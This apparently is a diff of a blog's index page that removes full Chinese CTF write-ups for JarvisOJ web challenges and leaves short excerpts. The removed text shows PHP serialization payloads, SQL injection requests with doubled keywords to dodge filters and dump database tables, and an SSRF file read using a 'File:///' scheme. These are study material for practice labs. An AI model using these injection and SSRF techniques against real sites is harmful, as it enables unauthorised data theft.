-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>尝试直接查看<code>pctf.php</code>没有成功</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'pctf.php'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=  <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/08/16/WKC9PquOA6FipmG.png" alt="quicker_f6470f92-f278-4533-8040-33be0a4804a7.png"></p>
-<h2>IN a mess</h2>
-<p>源代码提示访问 index.phps</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这个审计题目是见过的</p>
-<p>精心构造的payload</p>
-<p>用0a绕过弱类型，用伪协议绕过文件读取，用<code>%001111</code>绕过substr和strlen</p>
-<p><img src="https://i.loli.net/2019/08/16/Kt6qHmT2fUFQrav.png" alt="quicker_d87071e9-7b1b-46f4-925c-12de06f24ea6.png"></p>
-<p>之后来到第二关：</p>
-<p><img src="https://i.loli.net/2019/08/16/diMvmqeHyjugJcN.png" alt="quicker_92050a33-bfc6-4fb3-b1eb-27b0ecd571c1.png"></p>
-<p>发现是注入</p>
-<p>过滤了空格和一些关键字符，可以使用双写绕过</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql0.png" alt=""></p>
-<p>之后尝试爆字段</p>
-<p>字段数为3</p>
-<p><code>GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,3%23 HTTP/1.1</code></p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql1.png" alt=""></p>
-<p>数据库名：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql2.png" alt=""></p>
-<p>其实表是已经知道了，就是content，不过还是再手动爆一下：</p>
-<p>这里必须使用十六进制编码，不然得不到</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql3.png" alt=""></p>
-<p>爆字段</p>
-<p><code>GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(column_name)/*123*/frfromom/*123*/information_schema.columns/*123*/where/*123*/table_schema=0x74657374%23 HTTP/1.1</code></p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql4.png" alt=""></p>
-<p>获取数据</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql5.png" alt=""></p>
-<p><code>GET /%5eHT2mCpcvOLf/index.php?id=-1/*1222*/uniunionon/*123*/selselectect/*123*/1,2,group_concat(id,context,title)/*123*/frfromom/*123*/content HTTP/1.1</code></p>
-<h2>chopper</h2>
-<p>这题重新复现一下一叶飘零师傅的思路，同时好好理解一下什么是ssrf</p>
-<p>查看源码发现一个很有意思的点：</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>ISCC 2016<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin"</span>&gt;</span>管理员登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>那个图片是通过一个url加载出来的，于是我就尝试用自己blog上的图片</p>
-<p>果真如此：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf0.png" alt=""></p>
-<p>于是这就是一典型的SSRF了</p>
-<p>直接尝试读取文件</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf1.png" alt=""></p>
-<p>读取失败，尝试绕过</p>
-<p>直接大写一个字母就行</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf1-1.png" alt=""></p>
-<p>于是可以读取任意文件</p>
-<p>如果url不加参数</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf2.png" alt=""></p>
-<p>于是我们就知道了文件的位置</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">P_PROXY v0.2</span></span><br><span class="line"><span class="comment"><span class="doctag">@author</span>:haozigege</span></span><br><span class="line"><span class="comment"><span class="doctag">@time</span>:2016/3/19</span></span><br><span class="line"><span class="comment"><span class="doctag">@windows</span> extension=php_curl.dll(php.ini)</span></span><br><span class="line"><span class="comment"><span class="doctag">@linux</span> cd ext/curl;phpize  ./configure –with-curl;make;</span></span><br><span class="line"><span class="comment"><span class="doctag">@info</span> url全部通过GET来传递,如果使用POST，则读取POST数据发送请求,可以给中国菜刀提供接口;</span></span><br><span class="line"><span class="comment">cookie和其他http头部信息可以直接从请求中读取。</span></span><br><span class="line"><span class="comment"><span class="doctag">@update</span> 修改了host不一致的问题,去除了method参数简化了逻辑结构。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_result</span><span class="params">($curlobj)</span></span>&#123;</span><br><span class="line">	$result=curl_exec($curlobj);</span><br><span class="line">	$headerSize=curl_getinfo($curlobj,CURLINFO_HEADER_SIZE);</span><br><span class="line">	$res_header=substr($result, <span class="number">0</span>, $headerSize);</span><br><span class="line">	$result	=substr($result,$headerSize);</span><br><span class="line">	curl_close($curlobj); </span><br><span class="line">	set_response_header($res_header);</span><br><span class="line">	<span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getmyheader</span><span class="params">($curlobj,$headerlines)</span></span>&#123;</span><br><span class="line">	$res_headers=$headerlines;</span><br><span class="line">	<span class="keyword">return</span> $res_headers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_response_header</span><span class="params">($headers)</span></span>&#123;</span><br><span class="line">	$headarr=explode(<span class="string">"\r\n"</span>,$headers);</span><br><span class="line">	<span class="keyword">foreach</span>($headarr <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">		header($value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init_curl</span><span class="params">($link,$headers)</span></span>&#123;</span><br><span class="line">	$curlobj = curl_init(); </span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link); </span><br><span class="line">	curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//raw output</span></span><br><span class="line">	curl_setopt($curlobj, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">	curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span>	$curlobj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(getallheaders() <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">	<span class="keyword">if</span> ($key==<span class="string">'Content-Length'</span> <span class="keyword">and</span> <span class="keyword">isset</span>($_POST))&#123;</span><br><span class="line">		$post=http_build_query($_POST);</span><br><span class="line">		$value=strlen($post);</span><br><span class="line">	&#125;</span><br><span class="line">	$headers[]=$key.<span class="string">':'</span>.$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">	$link=$_REQUEST[<span class="string">'url'</span>];</span><br><span class="line">	$url=explode(<span class="string">'/'</span>,$link)[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* curl setting */</span></span><br><span class="line">	$curlobj = init_curl($link,$headers);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//GET</span></span><br><span class="line">	<span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>]==<span class="string">'GET'</span>)&#123;</span><br><span class="line">		<span class="comment">//READ FILE</span></span><br><span class="line">		<span class="keyword">if</span>(substr($link, <span class="number">0</span>,<span class="number">7</span>)==<span class="string">'file://'</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> substr($link,<span class="number">7</span>);</span><br><span class="line">		$result=<span class="string">""</span>;</span><br><span class="line">		<span class="comment">//$result=file_get_contents(substr($link,7));</span></span><br><span class="line">		<span class="keyword">echo</span> $result;</span><br><span class="line">		curl_close($curlobj);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_POST, <span class="number">0</span>); </span><br><span class="line">			curl_setopt($curlobj, CURLOPT_HTTPHEADER, [<span class="string">"HOST"</span>,$url]);</span><br><span class="line">			get_result($curlobj);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//POST</span></span><br><span class="line">			curl_setopt($curlobj, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_POSTFIELDS,$post);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_HTTPHEADER, [<span class="string">"HOST"</span>,$url]);</span><br><span class="line">			get_result($curlobj);</span><br><span class="line">			&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'invalid request'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>可以看出对协议的过滤很垃圾，就是看是不是file://开头的</p>
-<p>尝试读取index.php和index.html，index.php没有，index.html就是原来的页面</p>
-<p>这时候去admin目录下探测：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf3.png" alt=""></p>
-<p>尝试探测w文件：</p>
-<p><code>view-source:http://web.jarvisoj.com:32782/proxy.php?url=File:///opt/lampp/htdocs/admin/robots.txt</code></p>
-<p>就发现robots.txt</p>
-<p>于是读</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ssrf4.png" alt=""></p>
-
-          
+          神盾局的秘密
+查看页面源码，猜测是本地文
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/16/JarvisOJ/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2385,10 +2147,16 @@
       
         
           
-            <p>一道入群题</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-
-          
+          一道入群题
+12345678910111
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/16/记录php代码审计/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2474,7 +2242,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2496,7 +2264,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
